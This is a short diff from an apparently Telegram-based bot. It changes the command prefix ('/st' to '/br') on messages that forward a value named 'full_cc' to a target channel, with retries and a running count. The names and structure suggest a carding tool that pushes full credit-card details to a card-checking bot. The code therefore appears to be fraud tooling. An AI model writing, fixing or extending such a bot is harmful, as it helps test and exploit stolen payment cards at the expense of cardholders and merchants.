@@ -131,7 +131,7 @@ async def handler(event):
                     # Send to target channel with retry logic
                     for attempt in range(3):
                         try:
-                            msg = await client.send_message(TARGET_CHANNEL, f"/st {full_cc}")
+                            msg = await client.send_message(TARGET_CHANNEL, f"/br {full_cc}")
                             msg_counter += 1
                             logger.info(f"✅ SENT: {full_cc[:10]}*** | Total: {msg_counter}")
                             
